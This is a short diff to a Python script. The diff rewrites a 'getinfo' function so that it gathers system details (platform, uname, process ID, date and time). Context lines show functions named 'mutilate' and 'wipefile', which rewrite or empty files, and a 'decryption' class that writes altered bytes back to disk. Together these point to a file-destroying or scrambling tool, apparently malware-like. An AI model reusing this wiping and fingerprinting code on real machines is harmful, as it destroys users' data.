@@ -6,6 +6,7 @@ try:
   import hashlib
   import string
   from sys import platform
+  from datetime import datetime
 except ImportError:
   print("Error: Missing module(s) please install the following module(s): random, time, hashlib, string")
 
@@ -33,11 +34,16 @@ def mutilate(file):
     Fout.write(newLine)
 
 def getinfo():
-  username = os.getlogin()
-  os = sys.platform
-  time = time.now
-  encoding = sys.getfilesystemencoding()
+  OS = ("Operating-System: ", sys.platform)
+  currentTime = ("Time: ", datetime.now().time())
+  currentDate = ("Date: ", datetime.now().date())
+  sysUname = ("System-Information: ", os.uname())
+  currentProccess = ("Current-Process: ", os.getpid())
+  encoding = ("Encoding: ", sys.getfilesystemencoding())
 
+  returnList = (OS, currentDate, currentTime, currentProccess, encoding, sysUname)
+  return returnList
+  
 def wipefile(file):
   with open(file, "w") as Fout:
     Fout.truncate(0)
@@ -249,5 +255,4 @@ class decryption():
     with open(file, 'wb') as Fout:
       Fout.write(doubled)
       Fout.close()
-
 
